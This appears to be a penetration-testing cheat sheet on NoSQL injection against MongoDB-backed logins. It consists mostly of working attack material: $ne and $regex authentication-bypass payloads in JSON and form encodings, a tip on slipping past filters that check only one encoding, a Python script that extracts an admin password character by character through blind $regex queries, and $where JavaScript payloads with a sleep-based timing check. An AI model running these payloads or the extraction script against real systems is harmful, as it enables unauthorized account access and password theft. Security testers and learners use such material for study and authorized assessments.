# NoSQL injection checks

Mongo-backed input: compare literals with operators. See also [authentication.md](authentication.md).

```text
{"user":{"$ne":null},"pass":{"$ne":null}}
user[$ne]=x&pass[$ne]=x
user[$regex]=^admin
```
- Try both encodings: JSON body (`{"pass":{"$ne":null}}`, `Content-Type: application/json`) and form/query encoding (`pass[$ne]=1`) — a filter on one often misses the other.

## Blind extraction via `$regex`
One character at a time, anchored so a false match doesn't also match shorter guesses:
```python
import requests, string

url = "http://<IP>/login"
known = ""
alphabet = string.ascii_lowercase + string.digits
for _ in range(32):
    for c in alphabet:
        r = requests.post(url, json={"user": "admin", "pass": {"$regex": f"^{known}{c}"}})
        if "Welcome" in r.text:          # swap for the real success marker
            known += c
            break
    else:
        break
print(known)
```
- Success marker must be distinct from "wrong password" — check both responses manually first.

## `$where` blind (MongoDB, JS context only)
`$where` runs as JavaScript against the whole document — it's a **sibling** key in the query object, not nested under a field like `$ne`/`$regex` above:
```text
user=admin&$where=sleep(5000)||true
```
```json
{"user":"admin","$where":"this.password.length==8"}
```
- Timing-based (`sleep`) confirms server-side JS execution even blind; a length/character check confirms it without needing a timing side channel at all — faster when the response actually differs.
